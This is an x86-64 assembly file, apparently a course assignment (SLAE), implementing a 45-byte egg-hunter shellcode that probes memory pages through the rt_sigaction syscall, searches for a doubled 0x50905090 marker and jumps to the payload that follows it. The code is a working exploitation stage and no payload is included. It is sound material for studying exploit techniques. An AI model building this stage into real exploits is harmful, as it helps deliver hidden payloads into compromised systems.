; Author :      Demey Alexandre (PA-14186)
; Date :        03-06-2020
; 
; Description : SLAE assignment #3 - Egg hunter shellcode
;               Look in memory for the egg 0x90509050 repeated twice,
;               Then redirect code execution flow to the address following the egg.
;
; Shellcode length : 45 bytes



; skrox@kali:~$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h |grep sigaction
; #define __NR_rt_sigaction 13

global _start

section .text

_start:

;     xor esi, esi       ; set RSI to 0 to start from 0x000000001000 memory address

    lea rsi, [rel _start - 0x1000]  
                        ; uncomment to test the egghunter with shellcode.cpp, 
                        ; will start from the current memory page 
                        ; after "next_page" instructions 
                        ; and so we will not wait hours to see if the egghunter works

    cld                 ; Ensure that we search in memory in the reverse stack order
			; from lower to higher memory address

    push 8              ; sigset_t size
    pop r10             ; R10 set to sigsetsize

next_page:
    or si, 0xfff        ; Set RSI pointing to the last byte of the current page

next_address:
    inc rsi             ; Next offset, and next page if RSI is set to 0x0fff			
    jz next_page        ; if RSI point to 0x00 (null ptr) got to next_page

    xor edi, edi        ; set RDI to invalid signum (for more robustness cf. Skape paper)
    push 13
    pop rax             ; rt_sigaction syscall number
    cdq                 ; set RDX to null pointer
    syscall

    cmp al, 0xf2        ; check if EFAULT
    jz next_page        ; if EFAULT go to next page

    mov eax, 0x50905090 ; set EAX to our egg signature value
    mov rdi, rsi        ; set RDI to point to the address we want to check

    scasd               ; test for the first four bytes of the egg
                        ; scasd compare EAX with DWORD at the address set in RDI,
                        ; then increment the RDI register (DF is set to 0)
    jnz next_address    ; if it's not our egg signature go to the next address

    scasd               ; test for the four last bytes of the egg
    jnz next_address    ; if it's not go to the next address

    jmp rdi             ; Jump to our true payload,
                        ; The address following our egg
